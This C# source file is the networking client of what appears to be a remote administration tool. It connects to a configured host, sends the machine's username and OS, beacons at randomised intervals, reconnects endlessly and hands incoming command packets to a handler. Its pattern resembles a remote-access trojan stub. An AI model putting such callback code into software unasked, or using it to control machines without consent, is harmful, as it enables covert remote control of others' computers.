using Client.Settings;
using Microsoft.VisualBasic.Devices;
using Packets.Commands;
using Packets.Interfaces;
using Packets.Serialization;
using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using Client.PacketHandler;
using System.Diagnostics;

namespace Client.Networking
{
    public static class StaticClient
    {
        public static Socket ClientSocket;
        private static MemoryStream ClientMemory;
        private static bool IsPackeReceived;
        private static long PacketSize;
        private static byte[] ClientBuffer;
        private static Timer Tick;
        private static object LockSend;

        /// <summary>
        /// This is the main socket
        /// </summary>
        public static void InitializeClient()
        {
            Thread.Sleep(1500);
            try
            {
                Tick?.Dispose();
                ClientSocket?.Dispose();
                ClientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                ClientSocket.Connect(Config.Host, Config.Port);

                ClientMemory?.Dispose();
                ClientMemory = new MemoryStream();
                IsPackeReceived = false;
                PacketSize = 0;
                ClientBuffer = new byte[4];
                LockSend = new object();

                Send(new PacketIdentification() { Username = Environment.UserName, OperatingSystem = new ComputerInfo().OSFullName, Version = Config.Version });
                Tick = new Timer(new TimerCallback(Ping), null, new Random().Next(15 * 1000, 45 * 1000), new Random().Next(15 * 1000, 45 * 1000));

                ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, 0, ReceiveCall, null);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
                InitializeClient();
            }
        }

        private static void ReceiveCall(IAsyncResult ar)
        {
            try
            {
                if (!ClientSocket.Connected)
                {
                    InitializeClient();
                    return;
                }

                int received = ClientSocket.EndReceive(ar);
                ClientMemory.Write(ClientBuffer, 0, received);
                if (!IsPackeReceived)
                {
                    if (ClientMemory.Length == 4)
                    {
                        PacketSize = BitConverter.ToInt32(ClientMemory.ToArray(), 0);
                        ClientMemory.Dispose();
                        ClientMemory = new MemoryStream();
                        if (PacketSize > 0)
                        {
                            ClientBuffer = new byte[PacketSize];
                            IsPackeReceived = true;
                        }
                    }
                }
                else
                {
                    if (ClientMemory.Length == PacketSize)
                    {
                        IPacket packet = new PacketSerialization().Desirialize(ClientMemory);
                        ClientMemory.Dispose();
                        ClientMemory = new MemoryStream();
                        new Thread(() => { new Handler(packet); }).Start();
                        IsPackeReceived = false;
                        PacketSize = 0;
                        ClientBuffer = new byte[4];
                    }
                }
                ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, 0, ReceiveCall, null);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
                InitializeClient();
                return;
            }
        }

        public static void Send(IPacket packet)
        {
            try
            {
                lock (LockSend)
                {
                    if (!ClientSocket.Connected)
                    {
                        InitializeClient();
                        return;
                    }
                    else
                    {
                        using (MemoryStream memoryStream = new MemoryStream())
                        {
                            byte[] buffer = new PacketSerialization().Serialize(packet);
                            byte[] bufferSize = BitConverter.GetBytes(buffer.Length);
                            memoryStream.Write(bufferSize, 0, bufferSize.Length);
                            memoryStream.Write(buffer, 0, buffer.Length);
                            ClientSocket.Poll(0, SelectMode.SelectWrite);
                            ClientSocket.Send(memoryStream.ToArray(), 0, memoryStream.ToArray().Length, SocketFlags.None);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
                InitializeClient();
                return;
            }
        }

        private static void Ping(object obj)
        {
            try
            {
                if (!ClientSocket.Connected)
                {
                    InitializeClient();
                    return;
                }
                else
                {
                    Send(new PacketPing());
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
                InitializeClient();
                return;
            }
        }
    }
}
